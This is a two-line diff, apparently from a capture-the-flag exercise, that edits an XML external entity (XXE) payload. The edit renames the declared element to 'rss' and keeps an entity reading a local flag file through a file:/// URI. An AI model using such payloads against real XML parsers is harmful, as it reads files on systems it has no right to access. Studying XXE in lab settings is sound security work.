@@ -1,2 +1,2 @@
-<!ELEMENT foo ANY >
+<!ELEMENT rss ANY >
 <!ENTITY xxe SYSTEM "file:///flag_9e94ef10785f801d16ccebc319680f52" >
